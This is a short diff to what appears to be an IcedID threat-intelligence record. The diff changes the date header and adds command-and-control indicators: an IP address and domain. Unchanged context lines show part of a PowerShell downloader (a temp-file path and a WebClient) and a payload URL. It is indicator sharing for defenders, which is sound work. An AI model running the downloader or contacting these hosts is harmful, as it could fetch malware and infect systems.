@@ -1,4 +1,4 @@
-IcedID - 09/02/2022 
+IcedID | 09.02.2022
 
 ***************************************
 
@@ -22,3 +22,6 @@ $path = $Env:temp+'\KcLTCIObEkBj.bin'; $client = New-Object System.Net.WebClient
 
 https://a24b.com/bc/support.php?/YZdcXtfvSDx.bin
 
+Limited C2's Traffic
+
+103.208.86.7:80 | http://keepfootbal.com/
